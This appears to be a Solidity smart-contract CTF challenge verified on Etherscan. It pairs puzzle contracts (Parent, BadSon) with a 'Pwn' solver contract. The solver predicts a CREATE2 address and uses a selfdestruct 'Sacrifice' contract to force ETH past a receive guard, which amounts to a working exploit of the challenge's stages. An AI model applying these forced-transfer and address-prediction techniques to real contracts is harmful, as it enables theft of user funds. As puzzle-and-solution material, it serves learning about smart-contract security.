/**
 *Submitted for verification at Etherscan.io on 2023-02-02
*/

contract Parent {
    BadSon public immutable son;
    address public HouseOwner;

    event info(bytes32 indexed);

    constructor() {
        son = BadSon(payable(msg.sender));
        HouseOwner = son.owner();
    }
    
    function drain() external {
        require(msg.sender == address(son), "only son can call");

        (bool success, ) = payable(son).call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    function auctionHouse(
        address buyer,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(msg.sender == address(son), "only son can call");
        bytes32 msgHash = calcMsgHash();
        verifySig(msgHash, v, r, s);
        HouseOwner = buyer;
    }

    function calcMsgHash() public view returns (bytes32 msgHash) {
        uint256 chainId;
        assembly {
            chainId := chainid()
        }

        msgHash = keccak256(
            abi.encode(chainId, address(son), HouseOwner)
        );
    }

    function verifySig(
        bytes32 msgHash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal view {
        bytes32 hash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash)
        );

        require(ecrecover(hash, v, r, s) == HouseOwner, "not signed by owner");
    }
}

contract BadSon {
    address public immutable owner;
    Parent public parent;

    mapping(address => bool) public P1Winners;
    mapping(address => bool) public P2Winners;
    mapping(address => bool) public P3Winners;

    event P1Solved(address indexed addr);
    event P2Solved(address indexed addr);
    event P3Solved(address indexed addr);

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner!");
        _;
    }

    receive() external payable {
        require(msg.sender == address(parent), "only accept fund from parent");
    }

    constructor() {
        owner = msg.sender;
    }

    function marry() external {
        uint256 balanceB4 = address(this).balance;
        parent = new Parent{salt: bytes32(uint256(uint160(msg.sender)))}();
        parent.drain();
        require(
            address(this).balance >= (balanceB4 + 0.1 ether),
            "no enough money for <cai li>"
        );
        P1Winners[msg.sender] = true;
        emit P1Solved(msg.sender);
    }

    function birth() external {
        require(P1Winners[msg.sender], "must solve marriage problem first");
        uint256 balanceB4 = address(this).balance;
        parent.drain();
        require(
            address(this).balance >= (balanceB4 + 0.1 ether),
            "no enough money for <sheng wa>"
        );
        P2Winners[msg.sender] = true;
        emit P2Solved(msg.sender);
    }

    function scam(uint8 v, bytes32 r, bytes32 s) external {
        require(P2Winners[msg.sender], "must solve birth problem first");
        parent.auctionHouse(msg.sender, v, r, s);
        P3Winners[msg.sender] = true;
        emit P3Solved(msg.sender);
    }

    function retrieveETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract Sacrifice {
    constructor(address payable _recipient) payable {
        selfdestruct(_recipient);
    }
}

contract Pwn {

    receive()  external payable {}
    fallback() external payable {}

    function getAddress(BadSon son) public view returns (address) {
        bytes memory bytecode = type(Parent).creationCode;

        bytes32 _salt = bytes32(uint256(uint160(address(this))));

        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(son), _salt, keccak256(abi.encodePacked(bytecode)))
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint(hash)));
    }


    function solve1(BadSon son) external {
        address parent = getAddress(son);
        (bool success, ) = payable(parent).call{value: 0.1 ether}("");
        require(success, "ETH transfer failed on solve1");

        son.marry();
    }

    function solve2(BadSon son) external {
        address parent = getAddress(son);
        
        (new Sacrifice){value: 0.1 ether }(payable(parent));

        son.birth();
    }
}